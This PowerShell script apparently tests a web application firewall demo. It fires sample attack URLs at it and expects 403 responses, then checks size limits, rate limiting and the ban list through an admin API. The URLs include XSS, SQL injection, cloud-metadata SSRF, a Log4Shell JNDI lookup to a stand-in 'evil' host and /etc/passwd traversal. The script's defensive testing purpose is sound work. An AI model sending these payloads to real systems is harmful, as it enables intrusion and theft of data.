param(
    [string]$BaseUrl = "http://project.test",
    [string]$AdminUrl = "http://127.0.0.1:9191",
    [string]$Token = "SecurityEdgeDemo2026",
    [int]$BurstRequests = 60
)
$ErrorActionPreference = "Stop"
$headers = @{ Authorization = "Bearer $Token" }
function Section([string]$Text) { Write-Host "`n=== $Text ===" -ForegroundColor Cyan }

Section "WAF categories"
$attacks = @(
    "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "/login?username=admin%27%20OR%201%3D1--",
    "/fetch?url=http://169.254.169.254/latest/meta-data",
    "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
    "/download?file=..%2F..%2Fetc%2Fpasswd"
)
foreach ($path in $attacks) {
    $status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl$path"
    if ($status -ne "403") { throw "Expected 403 for $path, got $status" }
    Write-Host "[OK] 403 $path" -ForegroundColor Green
}

Section "Protocol size limit"
$longPath = "a" * 5000
$status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl/$longPath"
if ($status -ne "414") { throw "Expected 414 for oversized path, got $status" }
Write-Host "[OK] 414 oversized path" -ForegroundColor Green

Section "Hierarchical rate limit and auto-ban"
$codes = @{}
for ($i = 1; $i -le $BurstRequests; $i++) {
    $status = & curl.exe -s -o NUL -w "%{http_code}" "$BaseUrl/flood?i=$i"
    if (-not $codes.ContainsKey($status)) { $codes[$status] = 0 }
    $codes[$status]++
}
$codes.GetEnumerator() | Sort-Object Name | Format-Table Name, Value -AutoSize
if (-not $codes.ContainsKey("429")) { throw "No request was rate limited." }

Section "Protection state"
Invoke-RestMethod "$AdminUrl/api/v1/status" -Headers $headers | ConvertTo-Json -Depth 20
Invoke-RestMethod "$AdminUrl/api/v1/bans" -Headers $headers | ConvertTo-Json -Depth 20

Section "Clear temporary bans"
Invoke-RestMethod "$AdminUrl/api/v1/bans" -Headers $headers -Method Delete | ConvertTo-Json -Depth 10
Write-Host "Protection tests completed." -ForegroundColor Green
